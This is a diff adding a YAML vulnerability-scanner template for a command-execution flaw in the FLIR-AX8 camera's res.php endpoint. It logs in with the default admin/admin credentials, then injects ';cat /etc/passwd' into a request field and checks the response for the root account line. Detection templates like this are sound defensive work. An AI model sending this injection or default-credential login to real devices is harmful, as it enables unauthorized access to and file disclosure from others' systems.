@@ -1,0 +1,22 @@
+name: FLIR-AX8 res.php 后台命令执行漏洞
+rules:
+  r0:
+    request:
+      method: POST
+      path: /login/dologin
+      headers:
+        X-Requested-With: XMLHttpRequest
+      body: |
+        user_name=admin&user_password=admin
+    expression: response.status == 200 && response.body.bcontains(b'"success"')
+  r1:
+    request:
+      method: POST
+      path: /res.php
+      body: |
+        action=node&resource=;cat /etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0() && r1()
+detail:
+    links:
+        - https://mp.weixin.qq.com/s/KT3vLg49I61_j6Q7Rx6Mhg
